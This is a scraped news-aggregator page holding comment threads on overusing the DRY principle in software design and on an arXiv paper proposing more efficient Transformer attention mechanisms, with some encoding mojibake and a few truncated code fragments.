opposite error that is also waiting to wreck your code base. Listen to best practices. Don't apply them dogmatically, or without good judgment. reply znkr 2 hours agoparentprevI am the industry for over 10 years now. Whenever I have to work with a project where someone used DRY consciously, I know I am in for a world of pain. Consolidating code is easy, pulling it apart is a lot harder. reply lpapez 2 hours agorootparent> Consolidating code is easy, pulling it apart is a lot harder. I absolutely agree with this, and the only thing I would add is that is difference is even more pronounced in codebases using a dynamic language. Sure it's not easy to navigate a bowl of duplicated spaghetti, but navigating opaque DRY service classes without explicit types is a nightmare. Luckily as an industry we've realized the benefits of static typing, but your point still holds true there. reply 12_throw_away 59 minutes agorootparentprevI basically agree, but doesn't this just mean, if I'm consolidating non-DRY code, that I'm now the one using DRY consciously, and the next dev will be cursed with all of my newly introduced DRY abstractions? reply EugeneOZ 1 hour agorootparentprevI have 20 years in the industry and one of the rules I learned is: Articles justifying laziness are ALWAYS warmly welcomed and praised. To get internet points easily, write something of that: â€œClean code is overratedâ€ â€œSOLID is holding you backâ€ â€œTests are less important than profitsâ€ â€œKISS is the only important principleâ€ â€œDeclarative programming is only suitable for pet projectsâ€ â€œBorrow checker is the plague of Rustâ€ and so on. reply actionfromafar 2 hours agorootparentprevCan concur. Mostly it was I causing the pain, earlier. reply mytailorisrich 2 hours agorootparentprevHow do you consolidate code? Good way to go at it is to isolate the functionality that is used many times and to pull it aside in its own function (or similar). That's just good code practice and also makes it easy to refactor and modify as needed. reply znkr 58 minutes agorootparentItâ€™s not about being used many times, but about the necessity to evolve in the same direction. When that happens, it usually manifests as toil for the team. Consolidating code means to change the structure of the code so that only one piece needs to be modified in the future. That can take many forms, but it usually involves creating a new shareable component. Shareable components are more effort to maintain, so just creating them because they consolidate code is not always a good idea. You really want to have positive ROI here and you only get that if you actually reduce maintenance burden. For raw code duplication that doesnâ€™t have a maintenance issue on itâ€˜s own, the bar is a lot higher than most people think. reply PaulHoule 8 minutes agorootparentWell, this morning I just fixed a case where somebody had used btoa to base64 encode something in Javascript and used methods from Buffer somewhere else because they'd been intimidated away from using btoa. (Ok, it is dirty to use UTF-8 codepoints if it is byte values, you can write btoa(\"Ã\") but btoa(\"ä¸­\") is a crash.) It would have been OK if they'd used the right methods on Buffer but they didn't. These encoding/decoding methods are a very good example of code that should be centralized, not least so you can write tests for them. (It is a favorable case for testing because the inputs and outputs are well defined and there are no questions of whether execution is done like you might encounter testing a React component) It is so easy to screw this kind of thing up in a gross way or an a subtle way (I'm pretty sure btoa's weirdness doesn't affect my application because codepoints > 255 never show up... I think) There's the meme that you should wait until something used 3 times before you copy it but here is a case where two repetitions were too many and it had a clear impact on customers. reply jeltz 2 hours agoparentprevNot from my experience. Unnecessarily duplicated code, even when there are small differences which are likely accidental, is usually much easier to fix than too DRY code. Pulling apart false sharing can be really hard. reply danielmarkbruce 2 hours agoparentprevIn your part of the industry, perhaps. My experience has been the opposite. reply ravenstine 2 hours agorootparentSame. From what I've seen, most code is written with abstractions and DRY as a high priority rather than writing code that is performant and doesn't take jumping between 5 different files to make sense of it. reply danielmarkbruce 1 hour agorootparentI started writing Go around 2012 or so because of the file jumping thing. Drove me nuts. I'm sure there were many folks doing the same thing. reply nkozyra 2 hours agoparentprev> In the industry code that isn't DRY is a much bigger problem than code that is too DRY. As with anything dogmatic, it truly depends. There are times when the abstraction cost isn't worth it for a few semi-duplicate implementations you want to combine into a single every-edge-case function/method. reply PaulHoule 2 hours agorootparentThere's a certain psychological attraction to messy and confused situations which people are just too comfortable with but it explains why things like GraphQL (didn't have a definition for how it worked for years because \"Facebook is going to return whatever it wants to return\") inevitably win out over SPARQL (which has a well-defined algebra). One of my biggest gripes (related to the post) is the data structure create table student ( ... applied_date datetime, transcript_received datetime, recommendation_letter1_received datetime, recommendation_letter2_received datetime, rejected_date datetime, accepted_date datetime, started_classes_date datetime, suspended_date datetime, leave_of_absence_start_date datetime, leave_of_absence_end_date datetime, ... graduated_date datetime, ... gave_money_date datetime, died_date datetime ) which is of course an academic example but that I've seen in many kind of e-business application. Nobody ever seems to think of it until later but two obvious requirements are: (1) query to see what state a user was in at a given time, (2) show the history of a given user. The code to do that in the above is highly complex and will change every time a new state gets added. The customer also has experiences like \"we had a student who took two leaves of absence\" or \"some students apply, get rejected, apply again, then get accepted\" When you find data designs like this you also tend to find some of the records are corrupted and when you are recovering the history of users there will be some you'll never get right. If you think before you code you might settle on this design create table history ( student_id integer primary key, status integer not null, begin_date datetime not null, end_date datetime ) which solves the above problems and many others in most situations. (For one thing the obvious queries are trivial and event complex queries about times and events can be written with the better schema.) I can't decide if the thing I hate the most about being a programmer is having to clean up messes like the above or having to argue with other developers about why the first example is wrong. If \"No code\" is to really be revolutionary it's going to have to have built-in ontologies so that programmers get correct data structures for situations like the above that show up everyday in everyday bizaps where there is a clear right answer but it is usually ignored. reply gls2ro 1 hour agorootparentTwo points here just for fine grain discussion: 1. The first table structure is a flat non-normalized table structure that trades normalization for easy to query and select computed properties 2. Second structure is a normalized table structure that trades the normalization for joins. reply PaulHoule 29 minutes agorootparentEither one is normalized so far as I know. It is easy to write a query for the first that gets a list of students names and the dates they applied. That query is harder for the second one. On the other hand figuring out what state a user was in at time t could be a very hard problem with the first table. My experience with the first is that you find corrupted data records, one cause of that will be that people will cut and paste the SQL queries so maybe 10% of the time they wind up updating the wrong date. Systems like that also seem to have problems with data entry mistakes. The biggest advantage of #2 is ontological and not operational, which is that in a business process an item is usually in exactly one state out of a certain set of possible states. Turns out that this invariant influences the set of reasonable requirements that people could write, the subconscious expectations of what users expect, needs to be implicitly followed by an application, etc. Granted some of the dates I listed up there don't quite correspond to a state change, for instance the system needs to keep track of when a student started an application and when the last document (transcripts, letters, etc.) has been received. With 5 documents you would have 32 possible states of received or not and that's unreasonable, particularly considering that a student with just one letter and a very strong application in every other way might get accepted despite that. It's fair to say the student can have an \"open application\" and a \"complete application\". Similarly you could say the construction of an airplane or a nuclear power plant can be defined by several major phases but that these systems have many parts installed so if the left engine is installed but the right engine is not installed these are properties of the left and right engine as opposed to the plane. reply ldjkfkdsjnv 2 hours agoparentprevAbstraction too early is usually a mistake, no one is smart enough to predict all the possible edge cases. Repeated code allows someone to go in there and add an edge case easily. Its a more fool proof way of programming reply jacknews 2 hours agoparentprev\"In the industry code that isn't DRY is a much bigger problem than code that is too DRY.\" which industry is that? in general programming, absolute nope not-DRY code can be weaseled out with a good ide badly abstracted code, not so much in fact in a way, DRY is the responsibility of the IDE not the programmer - an advanced IDE would be able to sync all the disparate code segments, and even DRY them if necessary but when I read DRYed code, the abstraction better be a complete and meaningful summary, like 'make a sandwich', and without many parameters (and no special cases), or else I'd rather read the actual code i understand the impulse to try to factorize everything but it just doesn't work beyond a certain point in the real world; it's too difficult to read, and there's always an 'oh, can you just' requirement that upends the entire abstract tower. reply dec0dedab0de 1 hour agoprevBut donâ€™t stop telling new developers to be DRY, itâ€™s really just a way to remind them theyâ€™re allowed to make functions. Just step in when they go too far reply dailykoder 1 hour agoprevJust don't prematurely anything and write code that works. If you know how it works you automatically get an intuition what can be made better and where bottlenecks might be. Then you refactor it or just do a plain rewrite. It's really that simple. (There are always exceptions obviously) reply fiddlerwoaroof 43 minutes agoprevIâ€™ve always found that duplicating and editing over-DRY code is easier than fixing code thatâ€™s under-DRY. I strongly prefer working with people that care about DRY code and accidentally go too far than the reverse. Additionally, the worst problems Iâ€™ve had in inherited code have been due to duplication and insufficient abstractions leading to logical inconsistency. reply icoder 35 minutes agoprevReading a lot of this discussion I'm thinking whether DRY itself is the problem or it's more about mixing different (but perhaps comparable) things into one function (be it for the sake of appearing DRY or otherwise). reply rjurney 1 hour agoprevThis is especially true for a data scientist, where most code is throwaway. If you make it all spectacular, you aren't getting anything done. Data scientists' code should be \"eventually good,\" that is to say it gets refactored as it approaches a production environment. I talk about this in my last book, Agile Data Science 2.0 (Amazon 4.1 stars 7 years after publishing). https://www.amazon.com/Agile-Data-Science-2-0-Applications/d... I will say that after 20 years of working as a software engineer, data engineer, data scientist and ML engineer, I can write pretty clean Python all the time but this isn't common. reply chacham15 1 hour agoprevI think it depends on how you deduplicate your code. Creating a DeadlineSettter as illustrated is definitely too much, but creating a function: def assert_datetime_in_future(datetime): if datetimeAnd I don't think there are too many shortcuts to replace experience. But that's the point of these blogs: helping those without experience. Should we leave them to flounder on their own until they \"figure it out\" instead of trying to pass along wisdom? There's evidence that the best approach is, yes, experience â€“ but with Expert Feedback. In practice, this looks like pairing and informal apprenticeship with competent, seasoned engineers. I can confirm from my own experience how much you can learn from working with engineers \"further down the road\". reply zer00eyz 1 hour agoprevPeople talk about DRY and then happily type pip/gem/npm into their terminal, and never look at 99 percent of what they just downloaded... Did we all forget leftpad? https://qz.com/646467/how-one-programmer-broke-the-internet-... reply Leherenn 1 hour agoparentIsn't leftpad the natural conclusion of DRY? Everything is a unique, small, contained and tested library that other code can depend on instead of reimplementing it? The ultimate one source of truth, where if it breaks half the internet breaks. reply zer00eyz 26 minutes agorootparent> Isn't leftpad the natural conclusion of DRY? Everything is a unique, small, contained and tested library that other code can depend on instead of reimplementing it? There is nothing in dry that says \"util\" or \"frameworks\" or \"toolchains\" are bad. > The ultimate one source of truth, where if it breaks half the internet breaks. Dry says nothing about versioning, or vendoring or deleting your code from the internet... The reality is that leftpad wasnt used by that many things. Its just that the things that did use it were all over the dependency graph... reply pavlov 1 hour agoprevThis DRY-sceptical viewpoint is a bit similar to database denormalization. Sure, in theory you want to store every bit of information only once. But in practice it can make a real difference in smoothing out the access pattern if you donâ€™t follow this normalization religiously. The same applies to code. If you have to jump through hoops to avoid repeating yourself, it will also make it harder for someone else reading the code to understand whatâ€™s going on. A bit of â€œcode denormalizationâ€ can help the reader get to the point more quickly. reply DanielHB 2 hours agoprevBoilerplate that you can't get wrong is better than DRY in most cases by \"get wrong\" I mean through static analysis (linters or type checkers) or if it is plainly obvious by running it. reply hcarvalhoalves 1 hour agoprevThe article builds a straw man though. The \"bad example\" is bad because it introduces OOP for no reason at all. What's wrong with: def set_deadline(deadline): if deadlineApplying DRY principles too rigidly leads to premature abstractions that make future changes more complex than necessary. ... is just one of those things that sounds wise, but is just basically a tautology. Use the best tool for the job, etc. No kidding? Would never have thought of that on my own, thanks sensei. Seriously, the issue with the quoted statement is not that it's new to anyone, it's that no one thinks they ARE applying DRY principles \"too rigidly\". This is just chin beard stroking advice for \"everyone else\". reply AnimalMuppet 1 hour agoparentWell, then, here's some advice: Learn when to DRY, and when not. No, you probably don't know as well as you think you do. No, you're not going to get there by grinding leetcode. No, you aren't going to get there quickly, or without a lot of interaction with more-experienced peers, or without being told that your judgment is bad a few times. (And if you don't listen - really listen - then you don't learn.) Good judgment in these things takes time and experience. If you have a year of experience and think you know, you're probably wrong. reply wzdd 2 hours agoprevSeems like a strawman. The thing being repeated here is something which raises if the datetime isn't in the future. So abstract that out and you then get both methods calling raiseIfDateTimeNotInFuture() which then also serves as documentation. (But yes, if the actual code is as simple as this example, you may as well just repeat it.) reply globular-toast 54 minutes agoprevLike any rule this can be taken too far. It happens all the time. People like simple rules. They want everything to be like assembling IKEA furniture: no thought required, just follow the instructions. We all like it because it frees up the mind to think about other things. There are rules like \"don't stick your fingers in the plug socket\". But, if you're an electrician, you can stick your fingers in the plug socket because you've isolated that circuit. DRY is similar. As a programmer, you can repeat yourself, but you should be aware that it's thoroughly unwise unless you know you have other protections in place, because you know why such a rule exists. reply causal 2 hours agoprevYeah, premature DRY is a pet peeve of mine. Especially since the \"size\" of the code necessary to trigger DRY is totally subjective: some people apply DRY when they see similar blocks of code, others are so averse to repetition they start abstracting out native syntax. reply cjbgkagh 2 hours agoprevI thought it was Donâ€™t Repeat Yourself more than three times. reply pphysch 2 hours agoprev> Is the duplication truly redundant or will the functionality need to evolve independently over time? \"Looks the same right now\" != \"Is the same all the time\" Bad abstraction is worse than no abstraction reply localfirst 2 hours agoprevalso never write tests for code that doesn't exist because you gradually slow down learning to a crawl and you are no longer writing features but tests and mockups that offer nothing to the end user. reply idontwantthis 2 hours agoprevYour code should be WET before itâ€™s DRY (Write Everything Twice). reply zendist 2 hours agoparentThe rule of three[1] also comes to mind and is a hard learned lesson. My brain has a tendency to desire refactoring when I see two similar functions, I want to refactor--it's almost always a bad idea. More often than not, I later find out that the premature refactoring would've forced me to split the functions again. 1: https://en.m.wikipedia.org/wiki/Rule_of_three_(computer_prog... reply swader999 2 hours agorootparentNice, I advocate for this but never new it was a more formal thing. reply fellowniusmonk 2 hours agoparentprevOr alternatively, Write Everything Today. DRY when it's a wielded as a premature optimization (like all other premature optimization) prevents working code that is tailored to solving a problem from shipping quickly. reply thefaux 2 hours agoparentprevYes, why? reply idontwantthis 2 hours agorootparentBecause youâ€™re unlikely to write a good abstraction until you need it more than twice. And if you only need the code twice, you very likely wasted time writing the abstraction because copying updates between the two locations is not hard. This is a rule of thumb, Iâ€™m not trying to tell anyone how to do their job. reply S0y 2 hours agoprev\"premature optimization is the root of all evil\" reply pydry 2 hours agoprev [â€“] I don't know about anyone else, but I've been deeply unimpressed with the output of the google testing blog. This example is not wrong, but it's not particularly insightful either. Sandi Metz said it better here, 8 years ago https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction The testing pyramid nonsense is probably the worst one though. Instead of trying to find a sensible way to match the test type to the code, they pulled some \"one size fits all\" shit while advertising that they aren't that bothered about fixing their flaky tests. reply nrook 2 hours agoparentI think you're holding some of these to too high of a bar. This is a one-page article intended to be posted in company bathrooms. Of course it's less comprehensive than a longer blog post. reply pydry 2 hours agorootparentIt's not like the subtitle says \"not to be taken seriously\" and they are representing a brand that is supposed to stand for engineering excellence. reply bitcharmer 1 hour agoparentprevMost seasoned software engineers stopped following google in that respect a long time ago. They are not a tech shop any more; it's just an add business now with lots of SRE work. reply sitkack 2 hours agoparentprev [â€“] Google doesn't test! That is what production and SREs and users are for. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Dan Maksimovich advises against the premature application of the \"Don't Repeat Yourself\" (DRY) principle in coding, as it can lead to premature abstractions and complicate future changes.",
      "He suggests tolerating some code duplication initially to maintain clearer, context-specific logic and facilitate easier future modifications.",
      "Maksimovich's approach aligns with the \"You Aren't Gonna Need It\" (YAGNI) principle, which recommends avoiding the addition of unnecessary functionality until it is truly needed."
    ],
    "commentSummary": [
      "The discussion highlights the need to balance code readability and cohesion with the \"Don't Repeat Yourself\" (DRY) principle in software development.",
      "Contributors agree that while DRY enhances cohesion, it can complicate debugging due to nested abstractions, advocating for prioritizing readability and maintainability.",
      "The conversation underscores the importance of context-aware decision-making and trade-offs in engineering, emphasizing practical examples and historical insights on managing technical debt and optimizing critical performance areas."
    ],
    "points": 231,
    "commentCount": 153,
    "retryCount": 0,
    "time": 1717083954
  },
  {
    "id": 40515957,
    "title": "New Attention Mechanisms Surpass Standard Multi-Head Attention in Efficiency and Performance",
    "originLink": "https://arxiv.org/abs/2403.01643",
    "originBody": "Computer Science > Machine Learning arXiv:2403.01643 (cs) [Submitted on 3 Mar 2024] Title:You Need to Pay Better Attention Authors:Mehran Hosseini, Peyman Hosseini View PDF HTML (experimental) Abstract:We introduce three new attention mechanisms that outperform standard multi-head attention in terms of efficiency and learning capabilities, thereby improving the performance and broader deployability of Transformer models. Our first contribution is Optimised Attention, which performs similarly to standard attention, but has 3/4 as many parameters and one matrix multiplication fewer per head. Next, we introduce Efficient Attention, which performs on par with standard attention with only 1/2 as many parameters as many parameters and two matrix multiplications fewer per head and is up to twice as fast as standard attention. Lastly, we introduce Super Attention, which surpasses standard attention by a significant margin in both vision and natural language processing tasks while having fewer parameters and matrix multiplications. In addition to providing rigorous mathematical comparisons, we evaluate the presented attention mechanisms on MNIST, CIFAR100, IMDB Movie Reviews, and Amazon Reviews datasets. Subjects: Machine Learning (cs.LG); Artificial Intelligence (cs.AI); Computation and Language (cs.CL); Computer Vision and Pattern Recognition (cs.CV) MSC classes: 68T07 (Primary) 68T45, 68T50, 68T10, 15A03, 15A04 (Secondary) ACM classes: I.2.6; I.2.7; I.2.10; I.4.0; I.5.0; I.7.0 Cite as: arXiv:2403.01643 [cs.LG](or arXiv:2403.01643v1 [cs.LG] for this version)https://doi.org/10.48550/arXiv.2403.01643 Focus to learn more arXiv-issued DOI via DataCite Submission history From: Mehran Hosseini [view email] [v1] Sun, 3 Mar 2024 23:40:35 UTC (78 KB) Full-text links: Access Paper: View PDF HTML (experimental) TeX Source Other Formats view license Current browse context: cs.LGnewrecent2403 Change to browse by: cs cs.AI cs.CL cs.CV References & Citations NASA ADS Google Scholar Semantic Scholar export BibTeX citation Bookmark Bibliographic Tools Bibliographic and Citation Tools Bibliographic Explorer Toggle Bibliographic Explorer (What is the Explorer?) Litmaps Toggle Litmaps (What is Litmaps?) scite.ai Toggle scite Smart Citations (What are Smart Citations?) Code, Data, Media Code, Data and Media Associated with this Article Links to Code Toggle CatalyzeX Code Finder for Papers (What is CatalyzeX?) DagsHub Toggle DagsHub (What is DagsHub?) GotitPub Toggle Gotit.pub (What is GotitPub?) Links to Code Toggle Papers with Code (What is Papers with Code?) ScienceCast Toggle ScienceCast (What is ScienceCast?) Demos Demos Replicate Toggle Replicate (What is Replicate?) Spaces Toggle Hugging Face Spaces (What is Spaces?) Spaces Toggle TXYZ.AI (What is TXYZ.AI?) Related Papers Recommenders and Search Tools Link to Influence Flower Influence Flower (What are Influence Flowers?) Connected Papers Toggle Connected Papers (What is Connected Papers?) Core recommender toggle CORE Recommender (What is CORE?) IArxiv recommender toggle IArxiv Recommender (What is IArxiv?) About arXivLabs arXivLabs: experimental projects with community collaborators arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website. Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them. Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs. Which authors of this paper are endorsers?Disable MathJax (What is MathJax?)",
    "commentLink": "https://news.ycombinator.com/item?id=40515957",
    "commentBody": "New attention mechanisms that outperform standard multi-head attention (arxiv.org)229 points by snats 23 hours agohidepastfavorite44 comments westurner 15 hours agoBecause self-attention can be replaced with FFT for a loss in accuracy and a reduction in kWh [1], I suspect that the Quantum Fourier Transform can also be substituted for attention in LLMs. [1] https://syncedreview.com/2021/05/14/deepmind-podracer-tpu-ba... \"You Need to Pay Better Attention\" (2024) https://arxiv.org/abs/2403.01643 : > Our first contribution is Optimised Attention, which performs similarly to standard attention, but has 3/4 as many parameters and one matrix multiplication fewer per head. Next, we introduce Efficient Attention, which performs on par with standard attention with only 1/2 as many parameters as many parameters and two matrix multiplications fewer per head and is up to twice as fast as standard attention. Lastly, we introduce Super Attention, which surpasses standard attention by a significant margin in both vision and natural language processing tasks while having fewer parameters and matrix multiplications. \"Leave No Context Behind: Efficient Infinite Context Transformers\" (2024) https://arxiv.org/abs/2404.07143 : > A key component in our proposed approach is a new attention technique dubbed Infini-attention. The Infini-attention incorporates a compressive memory into the vanilla attention mechanism and builds in both masked local attention and long-term linear attention mechanisms in a single Transformer block. We demonstrate the effectiveness of our approach on long-context language modeling benchmarks, 1M sequence length passkey context block retrieval and 500K length book summarization tasks with 1B and 8B LLMs. Our approach introduces minimal bounded memory parameters and enables fast streaming inference for LLMs. reply ttul 2 hours agoparentThe 2D Discrete Fourier Transform (DFT) can replace attention because the 2D DFT looks a lot like attention. The algorithm loops over each pair of values in the input matrix, calculating first a linear combination of each pair that scales based on the distance between the values in the matrix. Closer values have more influence on each other than more distance values. This linear combination is fed into the famous e^(i*pi) equation that transforms it into a sinusoid. The sinusoids are summed up, giving you an output matrix that is a sum of sinusoids representing the frequency domain. By comparison, the attention algorithm also combines each pair of values in the input matrix, but that linear combination involves learned weights, rather than simple fixed basis functions (sines and cosines) in the DFT. The FNet paper suggests that the DFT works as a replacement for attention because in making the pairwise calculations to generate the 2D frequency representation of the input, information on these pairwise relationships is surfaced and made available to later feed-forward layers. As a handy add-on feature, the DFT also makes positional embedding unnecessary, because positional information is encoded by the DFT at each layer. That being said, in the paper they still applied positional embeddings so that they could make a direct comparison with the BERT architecture. Amazing how these old signal processing ideas have made their way into neural networks, still proving their effectiveness and efficiency after 100 years or more (Gauss devised the Fast Fourier Transform algorithm in 1805 but we left it mostly on the shelf until it was reinvented by Cooley and Tukey in 1965). reply mkaic 14 hours agoparentprevCan't believe that FNet paper flew under my radar all this timeâ€”what a cool idea! It's remarkable to me that it works so well considering I haven't heard anyone mention it before! Do you know if any follow-up work was done? reply CGamesPlay 13 hours agorootparentThis is the paper, which appears to be cited in hundreds of others, some of which appear to be about efficiency gains. https://arxiv.org/abs/2105.03824 reply westurner 4 hours agorootparent\"Fnet: Mixing tokens with fourier transforms\" (2021) https://arxiv.org/abs/2105.03824 https://scholar.google.com/scholar?cites=1423699627588508486... Fourier Transform and convolution. Shouldn't a deconvolvable NN be more explainable? #XAI Deconvolution: https://en.wikipedia.org/wiki/Deconvolution reply pests 13 hours agorootparentprevI know AI is moving fast but they were only published within the last month or three. reply mkaic 13 hours agorootparentI was referring to link [1] in GPâ€™s comment, which is to a paper published in 2021, not to either of the more recent papers they published. reply pests 1 hour agorootparentOops, apologies. reply lalaland1125 22 hours agoprev> The Transformer models, used in this experiment, all have a single attention layer with model dimension and context length 32. I think we are going to need to see more experiments here, especially because the theoretical motivations here are weak reply ttul 2 hours agoparentIâ€™m certainly not a domain expert, but one thing I have read repeatedly about Transformers is that not all tricks scale the same. reply lukemerrick 3 hours agoprevJust skimmed so far and didn't see any reference to the Simplified Transformer block of https://arxiv.org/abs/2311.01906 (and it seems they also left out grouped query attention, too, as pointed out by another comment). While lazy me wants them to explain how their approach compares to these approaches, it looks like their exposition is pretty clear (quite nice for a preprint!) and I guess I'll just have to actually read the paper for real to see for myself. Given how well I've seen Simplified Transformer blocks work in my own playground experiments, I would not at all be surprised if other related tweaks work out well even on larger scale models. I wish some of the other commenters here had a bit more curiosity and/or empathy for these two authors who did a fine job coming up with and initially testing out some worthwhile ideas. reply marcinzm 22 hours agoprevThese seems very tiny models and as I understand it LLMs behave fairly differently at different scales. The speed performance gain seems to only be on an M2 chip and I wonder if there's already much better non-GPU optimized attention approaches out there for those use cases. reply smaddox 17 hours agoprevThe first two changes appear theoretically sound, but it's not clear that they would result in an actual performance improvement at scale. Their analysis ignores that a single matrix multiplication is typically used to calculate the Q, K, and V values from the inputs. The third change looks like it would break causal masking for auto regressive language models. For masked token language models and ViTs, perhaps it's an improvement, though. reply renonce 14 hours agoprevAnother piece of solid work in this space is DeepSeek-v2. They proposed MLA which outperform standard attention a little but reduce KV cache by over a magnitude. Not sure if these improvements could come together. reply novaRom 8 hours agoprev> more efficient than standard attention whenever the model dimension is greater than or equal to the context length all practical models have context length significantly larger than model dimension reply Hugsun 6 hours agoprevI'm surprised they don't mention grouped query attention at all. reply jawon 18 hours agoprevCan anyone point me to models that look like they might actually be useful in moving towards AGI? I feel like I have a basic understanding of the transformer architecture, and multiplying X tokens in a sliding window across a set of static matrices to produce 1 new token does not look like a path to AGI. Yes, the complex feature extraction is impressive. But are there any models that, I don't know, are more dynamic? Have a working memory? Have a less limited execution path? reply samus 12 hours agoparentCurrent models can already argued to have something like working memory by storing information in little-used parts of the tokens. If placeholder tokens are handed to them that they can use as working memory, performance improves. https://openreview.net/forum?id=2dnO3LLiJ1 https://news.ycombinator.com/item?id=40329675 reply itissid 15 hours agoparentprevLook at JEPA and Modulo-LLM. Also AGI is a poor term to use because we as humans have no notion of what general intelligence is, does GI have morals and ethics, does it make decisions like we do based on executive functioning or does it work more like how ants do? reply idiotsecant 15 hours agoparentprevThe answer might just be scale for all we know. reply bbor 15 hours agoparentprevThe answer is simple: AI systems arenâ€™t just one technique, agent, or even agency â€” any somewhat anthropomorphic ones will be ensemblematic on an extensive and fundamentally-recursive level. LLMs are a groundbreaking technique that solve the â€œFrame Problemâ€ by emulating human subconscious generative networks. To paraphrase an old comment on here: the problem isnâ€™t a chatbot gaining sapience inside a browser window, the problem is when billions of dollars are allocated to a self-administering ensemble of 10,000 GPT agents, each specialized for some task (aka functions). That, plus Wikipedia, Cyc, WolfraAlpha, YouTube, and Google Books at its fingertips. â€œGeneralâ€ doesnâ€™t even begin to cover what weâ€™re already capable of, IMO. See: Marvin Minsky, 1991; https://ojs.aaai.org/aimagazine/index.php/aimagazine/article... reply canjobear 17 hours agoparentprevThere are sporadic attempts at making things more dynamic, like the Neural Turing Machine. It doesnâ€™t seem to buy much actual power. reply daavidhauser 14 hours agoparentprevxLSTM has a working memory and seems to outperform transformer architectures: https://arxiv.org/abs/2405.04517 reply GaggiX 20 hours agoprevThe models tested are extremely small, a few thousand parameters and the performance is of course not great, I don't think we can extrapolate much from this. I don't understand why they chose such small models when you can train much larger ones for free on Colab or Kaggle if you really need it. reply toxik 22 hours agoprevI feel like FlashAttention is the relevant baseline here. reply lalaland1125 22 hours agoparentFlashAttention is completely orthogonal to this. This work is about speeding up the computation of Q, K and V vectors while FlashAttention is about speeding up the attention algorithm itself. You could combine the two. reply 317070 22 hours agoprev> we evaluate the presented attention mechanisms on MNIST, CIFAR100, IMDB Movie Reviews, and Amazon Reviews datasets. It sounds amazing, but I'm not holding my breath this one will scale. reply janalsncm 21 hours agoparentSometimes it doesnâ€™t need to. You might have a problem that isnâ€™t web scale and where transfer learning is hard. We also need techniques for small datasets even if they are slower to train or are outperformed after 5 billion tokens. reply lgessler 19 hours agoparentprevYep, came here to say this. The big thing about the results here that might not be obvious to someone not in AI is that the models being trained in this paper are very many orders of magnitude smaller than the LLMs we've all heard so much about recently, and they're also being trained on specific tasks instead of general language modeling. So I'm not expecting this will find its way into a LLaMA near me any time soon, but maybe this is an interesting result for people working in the specific domains represented in the evaluations. reply r2_pilot 22 hours agoparentprevYou could provide the quote in full(\"In addition to providing rigorous mathematical comparisons,\") so that the author's work in proving their point is not hidden by your effortless snark. reply 317070 21 hours agorootparentI am not sure how much experience you have in this area of research, but maybe I can shed some light on the background here. The \"Attention is all you need\" paper is now almost 7 years old. Those 7 years have seen a flood of proposals on improving transformers, only very few have been retained. There is very little theoretic about transformer-style architectures. Fundamentally, the proof is in the pudding, not in \"mathematical comparisons\". A proposed change needs to scale better, it is all that matters. And the datasets mentioned are simply unsuitable for showing any scaling. I think the biggest dataset in this list, is 160MB compressed. I am not sure why this article was posted here on hackernews. I would estimate even just today, there have probably been about 3 papers posted on arXiv with proposed transformer architecture changes, tested on larger datasets than the ones mentioned here. reply 317070 21 hours agorootparentI checked, and on the 28th of May, arXiv has seen 14 submissions with \"transformer\" in the title, and I found 3 of them with proposals tested on larger datasets (I did not check all of them, there might have been more than these three). https://arxiv.org/pdf/2405.18240 https://arxiv.org/abs/2405.17951 https://arxiv.org/pdf/2405.17821 reply nomel 17 hours agorootparentprev> I am not sure why this article was posted here on hackernews. New is where progress comes from, so new is interesting. New is why we come here, and the first three letters of News. > here is very little theoretic about transformer-style architectures. Only way to fix that is with new. > Fundamentally, the proof is in the pudding, not in \"mathematical comparisons\" \"Can it scale\" is something only someone with money can answer. It can be tested, but only if it's known. Now new is better known. reply skyde 14 hours agoprevWhere is the code for it ? reply verisimi 18 hours agoprev> However, the behemothic sizes of these models have introduced numerous challenges, such as expensive and slow training and inference, leading to secondary problems such as high carbon emission, contributing to global warming Yes, there really has been an awful lot of hot air about ai. reply behnamoh 21 hours agoprev [â€“] Pressing [X] to doubt. There are many alternatives to the good old transformers: RWKV, Mamba, etc. Yet here we are, still using transformers (actually, just the decoder part). Is it because the industry has so much inertia to pick up new methods? I doubt it because there's $BILLIONS in this market and everyone wants a piece of the AI cake, so it doesn't make sense to ignore promising methods. Why, then, we barely see any non-transformer production-ready LLM these days? reply Buttons840 20 hours agoparentI believe the attention mechanism we use now was introduced in 2014 by Dzmitry Bahdanau, Kyunghyun Cho, and Yoshua Bengio in their paper titled \"Neural Machine Translation by Jointly Learning to Align and Translate.\" 2014. It took almost a decade for the potential of this technique to be realized and come to the attention (heh) of most developers. I don't know what researchers are doing with Mamba and RWKV, but we should let them cook. reply solidasparagus 21 hours agoparentprevItâ€™s going to take time. I canâ€™t speak to the actual quality of mamba other than to say the authors are extraordinary and should be taken seriously. But training a large model requires a huge amount of capital so the biggest runs are designed around risk minimization. And remember, many of the decision makers of these runs made are in their positions by doing transformer-centric work. The true value of mamba is still unclear to me with very long context techniques being effective for transformers. reply inciampati 17 hours agorootparentTo be frank, the long-context techniques that you're describing are still extremely limited in the length of context to consider, only a million-token order, and extremely expensive to apply. reply imtringued 12 hours agorootparentAnd yet quadratic attention is still unavoidable. Anything that lets you have sub quadratic attention is going to have an accuracy Vs performance tradeoff. reply inciampati 6 hours agorootparentNo, you can make multiple passes across the data set. There's no reason that you have to use quadratic attention. I point to the shape of our own brains, which are limited in size. Yet, through multiple passes over information and random access, which we guide, we're able to process very large systems. reply marcinzm 19 hours agoparentprev> Why, then, we barely see any non-transformer production-ready LLM these days? Because having a 5% better non-transformer model doesn't help you if as a result you can't use the 10% improvements people publish that only apply to transformers. Very quickly you'll be 5% worse than those who stuck with transformers, and have wasted a ton of time and money. reply hansvm 20 hours agoparentprev [â€“] > I doubt it because there's $BILLIONS in this market and everyone wants a piece of the AI cake, so it doesn't make sense to ignore promising methods. I also doubt this result. The \"why have $BILLIONS not already invested\" question is interesting in its own right though. Generally, the literature on the theoretical bounds of swarm optimization is pertinent. Those $BILLIONS aren't being invested by a single omniscient entity, so they're subject to interesting constraints. As one of many explanations, fragmentation is common. If $BILLIONS are split between greedy, mostly non-interacting entities (e.g., competing companies each trying to replace the transformer in a bounded number of hours and dollars while securing their market dominance), you expect, probabilistically, for each of them to converge on the same strateg(y/ies), especially if the \"best\" alternatives are obvious or globally known for some reason (e.g., some solutions intuitively feel 